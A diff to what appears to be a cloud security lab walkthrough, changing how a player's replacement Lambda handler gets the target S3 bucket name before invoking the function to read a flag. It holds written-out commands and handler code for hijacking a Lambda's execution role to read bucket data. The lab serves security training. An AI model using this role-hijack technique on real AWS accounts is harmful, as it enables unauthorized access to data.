@@ -55,16 +55,19 @@ aws lambda list-functions --query 'Functions[].FunctionName'
 
 ### Step 1: Craft the malicious payload
 
-Create a Python file whose name matches the Lambda handler. If the handler is `lambda_function.lambda_handler`, your file must be named `lambda_function.py`. The payload uses the execution role's identity to call `s3:GetObject` on the target bucket and returns the flag in the response body:
+Create a Python file whose name matches the Lambda handler. If the handler is `lambda_function.lambda_handler`, your file must be named `lambda_function.py`. The payload uses the execution role's identity to call `s3:GetObject` on the target bucket and returns the flag in the response body. Your starting user has no S3 permissions, so the bucket name comes from the platform, not the API -- take `TARGET_BUCKET` from the **Outputs** tab (`target_bucket_name`) next to your terminal before writing the handler. The bucket name is baked into the handler at write time: the heredoc's `EOF` is deliberately unquoted, so the shell expands your `TARGET_BUCKET` value into the code before it is zipped. That keeps the invocation payload empty — the player terminal's AWS CLI v2 rejects a raw JSON `--payload`, so the bucket travels inside the function instead of the event:
 
 ```bash
-cat > /tmp/lambda_function.py << 'EOF'
+TARGET_BUCKET=<paste the target_bucket_name output here>
+
+cat > /tmp/lambda_function.py << EOF
 import boto3
 import json
+import os
 
 def lambda_handler(event, context):
     s3 = boto3.client('s3')
-    bucket = event.get('bucket')
+    bucket = os.environ.get('TARGET_BUCKET', '${TARGET_BUCKET}')
     obj = s3.get_object(Bucket=bucket, Key='flag.txt')
     flag = obj['Body'].read().decode('utf-8')
     return {
@@ -111,14 +114,12 @@ aws lambda get-policy \
 
 ### Step 4: Invoke the function
 
-Wait a few seconds for the code update to propagate. Your starting user has no S3 permissions, so the bucket name comes from the platform, not the API -- take `TARGET_BUCKET` from the **Outputs** tab (`target_bucket_name`) next to your terminal, then invoke the function with it in the payload:
+Wait a few seconds for the code update to propagate. The handler already knows where to look for `flag.txt` — your `TARGET_BUCKET` was baked into it in Step 1 — so the invocation payload is empty:
 
 ```bash
-TARGET_BUCKET=<paste the target_bucket_name output here>
-
 aws lambda invoke \
   --function-name pl-prod-lambda-005-to-bucket-target-lambda \
-  --payload "{\"bucket\": \"${TARGET_BUCKET}\"}" \
+  --payload '{}' \
   /tmp/lambda-response.json
 
 cat /tmp/lambda-response.json
